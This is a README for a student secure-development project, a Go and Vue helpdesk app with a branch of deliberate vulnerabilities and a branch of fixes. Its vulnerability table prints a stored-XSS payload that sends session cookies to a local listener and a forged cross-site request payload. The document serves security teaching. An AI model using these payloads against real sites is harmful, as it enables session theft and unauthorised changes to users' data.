# Secure Web Helpdesk

A full-stack **ticketing / helpdesk** web application for managing support requests, users, and staff workflows. It is built for the **National College of Ireland — Secure Web Development** module: the **primary security focus** is applying **defence in depth** across authentication, session handling, authorization, input/output handling, CSRF protection, safe database access, and operational audit logging.

**Stack:** Vue 3 + TypeScript (SPA) + Tailwind CSS, Golang (Gin) REST API, MySQL (GORM, Goose), PASETO-based sessions tokens in **HttpOnly** cookies, **Argon2id** password hashing, **zerolog** structured logging. **Notification** used Mailpit Local Mail Server

---

## Features and security objectives

### Major functionality

| Area | What users can do |
|------|-------------------|
| **Accounts** | Sign up, log in, log out, change password, list/revoke sessions, password reset (mail/log driver) |
| **Roles** | Multiple roles (e.g. user(customer), staff, admin, super_admin) with **server-side** checks on sensitive routes |
| **Tickets** | Create, list, search, view, update, assign, change status, delete (within policy) |
| **Comments** | Add, list, update, delete ticket comments |
| **Admin** | Staff invites, user listing, role changes |

### Security objectives (mapped to implementation themes)

| Objective | How the project addresses it |
|-----------|------------------------------|
| **Strong authentication** | Argon2id password hashes |
| **Session integrity** | Short-lived access token + long refresh tokens; sessions and CSRF tokens (for update/post/delete requests) stored together in database |
| **Authorization** | Role and ownership checks on tickets and admin actions |
| **Injection & XSS** | Parameterized DB access; validated request DTOs; UI must not treat user text as HTML but as string |
| **CSRF** | `X-CSRF-Token` on protected and public-auth routes as the case may be |
| **Observability** | Structured logs; audit/append-only logging targeted in remediation docs |
| **Configuration** | Environment-driven secrets and DB settings (never commit real `.env` secrets) |

---

## Github Branch Stragety
I intentionally added some features on seperate branch. For example, I added audit logging to the app in vulnerable state, before implementing the secure fix. This is so that I can show how proper Audit Logging can help with easy detection.

- Vulnerability Branch: [vulnerable-baseline](https://github.com/chis0m/helpdesk/tree/vulnerable-baseline): Where the vulnerabilities were implemented
- Audit Logging: [add-audit-log-to-track-vuln](https://github.com/chis0m/helpdesk/tree/add-audit-log-to-track-vuln): Audit Log was implemented seperately in the apps vulnerable state to show how auditing can help easily detect attacks
- Secure Fix Branch: [secure-fix](https://github.com/chis0m/helpdesk/tree/secure-fix): The branch were all the vulnerabilities were fixed

## Project structure

```
helpdesk/
├── backend/                 # Go API (Gin, GORM, Goose migrations)
│   ├── cmd/server/          # Application entrypoint (`main`)
│   ├── boot/                # App bootstrap (HTTP server, DI wiring)
│   ├── internal/
│   │   ├── auth/            # Tokens, CSRF header names, cookie names
│   │   ├── config/          # Environment configuration
│   │   ├── container/       # Dependency injection container
│   │   ├── controllers/     # HTTP handlers (e.g. auth, users, tickets)
│   │   ├── middleware/      # Auth, CSRF, rate limits, session checks
│   │   ├── models/          # GORM models
│   │   ├── repositories/     # Database access layer
│   │   ├── services/        # Business logic
│   │   ├── routes/          # Route registration and management
│   │   └── requests/        # Request and validation structs
|   |   ├── response/        # Response management
│   ├── migrations/          # SQL migrations (using Goose)
│   ├── seed/                # Optional seed data for immediate testing
│   ├── makefile             # Makefile for easy command execution
│   └── go.mod
├── frontend/                # Vue 3 + Vite + TypeScript + Tailwind
│   ├── src/
│   │   ├── api/             # HTTP client modules (auth, tickets, users)
│   │   ├── views/           # Pages (login, tickets, profile, admin, …)
│   │   ├── components/      # Layout and UI components
│   │   ├── router/          # Vue Router definitions
│   │   ├── stores/          # Auth/session client state
│   │   └── utils/           # Shared helpers
│   ├── vite.config.ts
│   └── package.json
├── sast/                    # Saved SAST / dependency scan JSON (CA appendix)
└── README.md                # Setup Instruction and general app info
```

## Setup and installation

### Prerequisites

- **Go** (see `backend/go.mod` for version)
- **Node.js** (LTS recommended) and **npm**
- **MySQL** 8.x (or compatible)
- **Goose** for migrations: `go install github.com/pressly/goose/v3/cmd/goose@latest`

### 1. Database

Create a database and user (example):

```sql
CREATE DATABASE helpdesk CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'helpdesk'@'localhost' IDENTIFIED BY 'your_password';
GRANT ALL ON helpdesk.* TO 'helpdesk'@'localhost';
FLUSH PRIVILEGES;
```

### 2. Backend environment

From `backend/`:

```bash
cp .env.example .env
```

Setup variables on you can rely on the defaults at `internal/config/env.go`

Start the API:

```bash
cd backend/ && make serve
```
This also runs migrations, and it runs the default seed if `SEED_CA` is set to true

Default API port is **`8080`** unless `PORT` is set.

### 3. Frontend

```bash
cd frontend
npm install
```

Make sure the `VITE_PORT` and `VITE_API_BASE_URL` matches the backend records.
VITE_PORT is frontend port, which should match `FRONTEND_URL` in the `.env.go`
VITE_API_BASE_URL is the backend url

```bash
npm run dev      # development server
npm run build    # production build
npm run lint     # ESLint
```

Open the URL printed by Vite (typically `http://localhost:3000`).

---

## Usage guidelines

1. **Register / log in** — login through /login in the UI e.g http://127.0.0.1:3000/login. If you set `SEED_CA` to true, then use `cassey.admin@secweb.ie` to login and `password` as password. Or you can just signup.
2. **Tickets** — Create a ticket from the dashboard; open a ticket to view details, status, assignment, and comments.
3. **Search** — Use ticket search; the server must bind search parameters safely (no raw string concatenation into SQL).
4. **Profile & sessions** — Update profile where allowed; review and revoke other sessions from the sessions view.
5. **Admin / staff** — Elevated actions (invites, role changes, staff creation) require an appropriate role; all checks are enforced **on the server**, not only in the UI.

---

## Security improvements (vulnerabilities addressed)

The project follows a structured vulnerability and remediation plan **VULN-01 … VULN-06** labels on the vuln-baseline branch, with matching improvement IDs **SEC-01 … SEC-06** on the secure branch.

### Vulnerabilities

| ID | Topic | Risk | Vulnerability summary |
|----|-------|------|-------------------------|
| **VULN-01** | Session cookie flags | Tokens readable by JS or sent over HTTP | Session cookies **`HttpOnly=false`**, **`Secure=false`**, exposing tokens to script access, insecure transport. |
| **VULN-02** | IDOR | Access other users’ profiles or tickets by ID | Clients may reference guessable resource IDs; the API does not enforce **ownership or role** before returning or mutating another user’s profile or ticket. |
| **VULN-03** | Stored XSS | User content executed as HTML | Ticket or comment text is rendered as **HTML** in the UI (**v-html**) or passed unsafely into templates, allowing **stored script** execution in victims’ browsers e.g `<img src=x onerror="new Image().src='http://127.0.0.1:4444/?c='+encodeURIComponent(document.cookie)">` |
| **VULN-04** | CSRF | Cross-site form posts mutate state | State-changing requests accept **session cookies** without a **bound anti-CSRF token** to the session, allowing malicious sites to trigger actions with invalid csrf tokens. e.g `<img src=x onerror='fetch("http://127.0.0.1:5000/api/tickets/4",{method:"PATCH",credentials:"include",headers:{"Content-Type":"application/json","X-CSRF-Token":"invalid-xxx"},body:JSON.stringify({description:"You have been pwned."})})'` |
| **VULN-05** | Weak audit trail | No forensic trail for incidents | Sensitive actions may leave **no footprint** of actor, action, and outcome, hindering detection, incident review and non-repudiation. |
| **VULN-06** | SQL injection (search) | Search query concatenated into raw SQL | User search input may be **concatenated into SQL strings**, allowing **injection** and unintended data access or modification. |

### Improvements

| ID | Topic | Improvement summary |
|----|-------|---------------------|
| **SEC-01** | Session cookie flags | Set **`HttpOnly=true`**, **`Secure=true`** in production (HTTPS) while local `Secure=false`, consistent **`SameSite=strict`**; same flags when clearing cookies. |
| **SEC-02** | IDOR | Prefer **`GET/PATCH /api/users/me`** only; enforce **ticket access policy** so only owner or admin can access tickets; use **UUID** identifiers where appropriate. |
| **SEC-03** | Stored XSS | **`TrimSpace`** on text fields at the backend; render ticket/comment bodies as **plain text** in the frontend (**no `v-html`** on user-controlled fields). |
| **SEC-04** | CSRF | **`CSRFRequired`** middleware: compare **`X-CSRF-Token`** to the session token with **constant-time** equality before `c.Next()`. |
| **SEC-05** | Weak audit trail | **`audit_logs`** in append-only mode, actor from **session only**, optional metadata; **no secrets** in log payloads. |
| **SEC-06** | SQL injection (search) | **Parameterized** search queries (GORM placeholders); no raw concatenation of user input into SQL. |

Code locations are tagged with `// VULN-…` (e.g. **`// VULN-01`**) on the vulnerability branch (**`vulnerable-baseline`**), then replaced with **`// SEC-…`** (e.g. **`// SEC-01`**) on **`secure-fix`**.

---

## Testing process

Security validation combines **Go SAST** (**gosec**), **Go dependency** analysis (**govulncheck**), **npm** dependency audit, **lint**, and **manual functional** checks (sessions, CSRF, authorization, safe search). Reports are saved under **`sast/`**.

### Install CLI tools (once)

```bash
go install github.com/securego/gosec/v2/cmd/gosec@latest
go install golang.org/x/vuln/cmd/govulncheck@latest
```

Ensure `$(go env GOPATH)/bin` is on your **`PATH`**.

### Backend (`cd backend`)

```bash
cd backend
gosec -fmt json -out ../sast/gosec-report-vuln.json ./...
govulncheck -json ./... > ../sast/backend-govulncheck.json
```

After fixes, gosec was rerun to a clean report, for example:

```bash
gosec -fmt json -out ../sast/gosec-report-vuln-fixed.json ./...
```

**`govulncheck`** reported no known reachable vulnerabilities against the scanned **`go.mod`** in the last run (**`sast/backend-govulncheck.json`**).

### Frontend (`cd frontend`)

```bash
cd frontend
npm audit --json > ../sast/frontend-npm-audit-vuln.json
npm audit fix --force
npm audit --json > ../sast/frontend-npm-audit-vuln-fix.json
npm run lint
# To fix lint issues
npm run lint -- --fix
```

### Key findings (summary)

| Tool | Findings & fix |
|------|----------------|
| **gosec** | **`sast/gosec-report-vuln.json`**: **G115** (`int`→`uint32` in Argon2 helpers), **G203** (`template.HTML` in email HTML). To **Fix:** create help to convert int to `uint32` conversion; email layout split so plain text is template-escaped. **`sast/gosec-report-vuln-fixed.json`**: **0** issues. |
| **govulncheck** | No vulnerable **Go** dependencies reported, check **`sast/backend-govulncheck.json`**. |
| **npm audit** | Vulnerabilities listed in **`sast/frontend-npm-audit-vuln.json`** (e.g. **TypeScript-ESLint** chain); addressed with **`npm audit fix`**, captured in **`sast/frontend-npm-audit-vuln-fix.json`**. |
| **Functional** | Manual checks: cookies, 403 on forbidden access, CSRF rejection, safe search — detailed in the CA report. |

**Supplementary checks (optionally):** **Semgrep** and **Snyk** were also run for a general pattern and dependency view across frontend/backend, the output JSON is in **`sast/`**.

---

## Contributions and references

- **Author / course:** Developed as part of **NCI MSCCYB — Secure Web Development** (Continuous Assessment). **Contributors:** see Git commit history; this repository is the canonical source for the helpdesk project.

**Frameworks and libraries (non-exhaustive)**

| Component | Reference |
|-----------|-----------|
| HTTP router | [Gin](https://github.com/gin-gonic/gin) |
| ORM | [GORM](https://gorm.io/) |
| Migrations | [Goose](https://github.com/pressly/goose) |
| Frontend | [Vue.js](https://vuejs.org/), [Vite](https://vitejs.dev/), [Vue Router](https://router.vuejs.org/) |
| Password hashing | [golang.org/x/crypto](https://pkg.go.dev/golang.org/x/crypto) (Argon2) |
|Argon2d Implementation|[How to Hash and Verify Passwords with Argon2 in Go](https://www.alexedwards.net/blog/how-to-hash-and-verify-passwords-with-argon2-in-go)
| Tokens | [PASETO](https://github.com/o1egl/paseto) |
|MySQL Databae|

**Security guidance (for design and report citations)**

- [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## Repository hygiene

- Prefer **small, meaningful commits** over larg commits
- Keep **`.env` out of git**
- Run **`go fmt`**, **`go test ./...`**, **`gosec`**, **`govulncheck`**, **`npm audit`**, and **`npm run lint`** before submitting assessment work.
